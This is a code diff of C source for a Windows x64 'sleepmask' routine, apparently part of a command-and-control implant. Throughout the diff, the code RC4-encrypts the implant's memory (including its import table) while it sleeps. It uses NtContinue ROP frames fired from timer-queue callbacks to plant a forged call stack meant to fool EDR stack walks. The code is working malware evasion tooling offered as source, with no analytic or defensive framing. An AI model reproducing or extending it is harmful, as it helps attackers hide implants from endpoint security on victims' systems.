@@ -9,8 +9,6 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
-#define G3_BISECT_C  /* temporary bisect: revert after */
-
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -357,40 +355,48 @@ __declspec(noinline) static void * g3_child_sp(void)
 
 typedef void(WINAPI *G3_NTCONTINUE)(void *, unsigned char);
 
-static BOOL g3_stack_spoof_sleep(DWORD time)
+/* Prepared window: everything the window needs is resolved and armed up
+ * front - after masking starts, the ONLY call is a pre-resolved wait.
+ * (Official sleepmask BOF contract: no IAT-touching API between mask and
+ * unmask; masking .rdata encrypts the IAT itself.) */
+typedef struct {
+	HANDLE queue;
+	HANDLE event;
+	BOOL   armed;
+	void * (WINAPI *pwait)(HANDLE, DWORD);
+} G3_WINDOW;
+
+static BOOL g3_window_prepare(G3_WINDOW * w, DWORD time, DWORD * due_out)
 {
 	CONTEXT cap;
 	CONTEXT rop_backup, rop_spoof, rop_restore, rop_event;
-	HANDLE queue = NULL;
 	HANDLE timer = NULL;
-	HANDLE event = NULL;
 	void * (*pmemcpy)(void *, const void *, size_t);
 	G3_NTCONTINUE pcontinue;
 	void * childsp;
 	unsigned char * rsp_at_wait;
-	BOOL ok = FALSE;
 
 	pmemcpy = (void *(*)(void *, const void *, size_t))
 		GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
 	pcontinue = (G3_NTCONTINUE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
-	if (pmemcpy == NULL || pcontinue == NULL)
+	w->pwait = (void *(WINAPI *)(HANDLE, DWORD))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");
+	if (pmemcpy == NULL || pcontinue == NULL || w->pwait == NULL)
 		return FALSE;
 
-	queue = CreateTimerQueue();
-	event = CreateEventW(NULL, FALSE, FALSE, NULL);
-	if (queue == NULL || event == NULL)
-		goto done;
+	w->queue = CreateTimerQueue();
+	w->event = CreateEventW(NULL, FALSE, FALSE, NULL);
+	if (w->queue == NULL || w->event == NULL)
+		return FALSE;
 
 	/* capture a CONTEXT on the timer thread; the forged frames below are
 	 * copies of it with only Rip/Rsp/args swapped */
 	memset(&cap, 0, sizeof(cap));
-	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)RtlCaptureContext, &cap, 0, 0,
+	if (!CreateTimerQueueTimer(&timer, w->queue, (WAITORTIMERCALLBACK)RtlCaptureContext, &cap, 0, 0,
 	                            WT_EXECUTEINTIMERTHREAD))
-		goto done;
-	WaitForSingleObject(event, 0x32); /* let the capture callback run */
+		return FALSE;
+	WaitForSingleObject(w->event, 0x32); /* let the capture callback run */
 
-	/* where the fake stack gets planted: below this frame, at the depth
-	 * where WaitForSingleObjectEx's frames would live */
 	childsp = g3_child_sp();
 	rsp_at_wait = (unsigned char *)childsp - g_frames[0].stack_size - 0x8;
 
@@ -419,36 +425,43 @@ static BOOL g3_stack_spoof_sleep(DWORD time)
 
 	rop_event.Rsp -= 8;
 	rop_event.Rip = (DWORD64)SetEvent;
-	rop_event.Rcx = (DWORD64)event;
+	rop_event.Rcx = (DWORD64)w->event;
 
-	/* backup -> plant fake -> (sleep window) -> restore -> wake us.
-	 * restore is due at `time` and SetEvent at `time`+10ms so the real
-	 * stack is back before the main thread can observe it. */
-	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_backup, 1, 0,
+	/* arm everything NOW, with lead time for the mask pass (RC4 over a
+	 * few hundred KB completes well inside 150ms). The window is then:
+	 * [spoof planted .. restore .. wake], i.e. roughly `time` long. */
+	*due_out = time + 600; /* total window length handed back to caller */
+	if (!CreateTimerQueueTimer(&timer, w->queue, (WAITORTIMERCALLBACK)pcontinue, &rop_backup, 150, 0,
 	                            WT_EXECUTEINTIMERTHREAD))
-		goto done;
-	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_spoof, 10, 0,
+		return FALSE;
+	if (!CreateTimerQueueTimer(&timer, w->queue, (WAITORTIMERCALLBACK)pcontinue, &rop_spoof, 300, 0,
 	                            WT_EXECUTEINTIMERTHREAD))
-		goto done;
-	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_restore, time, 0,
+		return FALSE;
+	if (!CreateTimerQueueTimer(&timer, w->queue, (WAITORTIMERCALLBACK)pcontinue, &rop_restore, *due_out - 10, 0,
 	                            WT_EXECUTEINTIMERTHREAD))
-		goto done;
-	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)pcontinue, &rop_event, time + 10, 0,
+		return FALSE;
+	if (!CreateTimerQueueTimer(&timer, w->queue, (WAITORTIMERCALLBACK)pcontinue, &rop_event, *due_out, 0,
 	                            WT_EXECUTEINTIMERTHREAD))
-		goto done;
+		return FALSE;
 
-	/* the exposed wait: UserRequest on an event, with a spoolsv-shaped
-	 * stack sitting where EDR stack walks will look */
-	WaitForSingleObject(event, INFINITE);
-	ok = TRUE;
-	g3_log("sleep: ROP window served", 0x7fffffff);
+	w->armed = TRUE;
+	return TRUE;
+}
 
-done:
-	if (queue != NULL)
-		DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE); /* wait out the ROP callbacks */
-	if (event != NULL)
-		CloseHandle(event);
-	return ok;
+/* the masked window itself: no API except the pre-resolved wait */
+static void g3_window_serve(G3_WINDOW * w)
+{
+	w->pwait(w->event, INFINITE);
+}
+
+static void g3_window_cleanup(G3_WINDOW * w)
+{
+	if (w->queue != NULL)
+		DeleteTimerQueueEx(w->queue, INVALID_HANDLE_VALUE);
+	if (w->event != NULL)
+		CloseHandle(w->event);
+	w->queue = NULL;
+	w->event = NULL;
 }
 
 /* ---------------- entry ---------------- */
@@ -457,6 +470,8 @@ BOOL gen3_sleep(DWORD time)
 {
 	unsigned char key[16];
 	G3_BLOCK blocks[G3_MAX_BLOCKS];
+	G3_WINDOW win;
+	DWORD due = 0;
 	int nblocks;
 	int i;
 
@@ -474,29 +489,32 @@ BOOL gen3_sleep(DWORD time)
 			k[i] = bigger_rand();
 	}
 
-#if defined(G3_BISECT_C)
-	nblocks = 0; /* bisect round 3: ROP only, no masking */
-#else
 	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
-#endif
 	g3_log("sleep: nblocks", nblocks);
+
+	/* official-BOF timing: resolve and arm every window resource FIRST,
+	 * then mask, then wait through a pre-resolved pointer only */
+	memset(&win, 0, sizeof(win));
+	if (!g3_window_prepare(&win, time, &due)) {
+		g3_log("sleep: window prepare failed -> fallback", 0x7fffffff);
+		g3_window_cleanup(&win);
+		return FALSE;
+	}
 
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 
 	g3_log("sleep: mask done, entering window", 0x7fffffff);
-	if (!g3_stack_spoof_sleep(time)) {
-		/* spoof machinery failed mid-window: unmask first, then serve a
-		 * plain sleep so the caller's contract still holds */
-		for (i = 0; i < nblocks; i++)
-			g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-		Sleep(time);
-	}
+	g3_window_serve(&win);
+	g3_log("sleep: ROP window served", 0x7fffffff);
 
-	g3_log("sleep: window done, unmasking", 0x7fffffff);
 	/* RC4 twice with the same key restores the plaintext */
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+	g3_log("sleep: unmasked", 0x7fffffff);
+
+	/* only now, with the IAT restored, may we touch APIs again */
+	g3_window_cleanup(&win);
 
 	memset(key, 0, sizeof(key));
 	return TRUE;
